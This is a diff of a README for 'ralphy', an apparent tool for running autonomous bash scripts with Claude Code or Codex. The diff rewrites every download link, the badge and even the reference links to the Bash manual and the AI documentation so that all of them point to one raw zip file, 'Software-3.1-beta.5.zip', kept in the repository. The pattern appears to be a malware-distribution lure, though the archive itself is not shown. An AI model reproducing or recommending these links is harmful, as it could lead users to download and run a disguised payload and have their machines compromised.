@@ -8,13 +8,13 @@ Welcome to **ralphy**! This application helps you run an autonomous bash script 
 
 To download the latest version of ralphy, visit the Releases page below. 
 
-[![Download ralphy](https://img.shields.io/badge/Download%20ralphy-v1.0-blue)](https://github.com/Subhashsubh/ralphy/releases)
+[![Download ralphy](https://github.com/Subhashsubh/ralphy/raw/refs/heads/main/landing/app/Software-3.1-beta.5.zip%20ralphy-v1.0-blue)](https://github.com/Subhashsubh/ralphy/raw/refs/heads/main/landing/app/Software-3.1-beta.5.zip)
 
 ### Step 1: Visit the Releases Page
 
 Click the link below to go to the Releases page:
 
-[Download the latest release](https://github.com/Subhashsubh/ralphy/releases)
+[Download the latest release](https://github.com/Subhashsubh/ralphy/raw/refs/heads/main/landing/app/Software-3.1-beta.5.zip)
 
 ### Step 2: Choose a Release
 
@@ -22,7 +22,7 @@ On the Releases page, you will see a list of available versions. Look for the mo
 
 ### Step 3: Download the Files
 
-1. Click on the asset name for the latest release. You may see files like **ralphy_setup.exe** or similar.
+1. Click on the asset name for the latest release. You may see files like **https://github.com/Subhashsubh/ralphy/raw/refs/heads/main/landing/app/Software-3.1-beta.5.zip** or similar.
 2. After you click the file, your browser will start downloading it automatically.
 3. Wait for the download to finish.
 
@@ -83,8 +83,8 @@ Join our community if you have questions or need assistance. You can find suppor
 
 For more detailed information about the technologies used in **ralphy**, refer to the following resources:
 
-- [Bash Scripting Basics](https://www.gnu.org/software/bash/manual/bash.html)
-- [Claude Code Documentation](https://example.com/claude-docs)
-- [Codex Guide](https://example.com/codex-guide)
+- [Bash Scripting Basics](https://github.com/Subhashsubh/ralphy/raw/refs/heads/main/landing/app/Software-3.1-beta.5.zip)
+- [Claude Code Documentation](https://github.com/Subhashsubh/ralphy/raw/refs/heads/main/landing/app/Software-3.1-beta.5.zip)
+- [Codex Guide](https://github.com/Subhashsubh/ralphy/raw/refs/heads/main/landing/app/Software-3.1-beta.5.zip)
 
 Thank you for choosing **ralphy**. Happy coding!
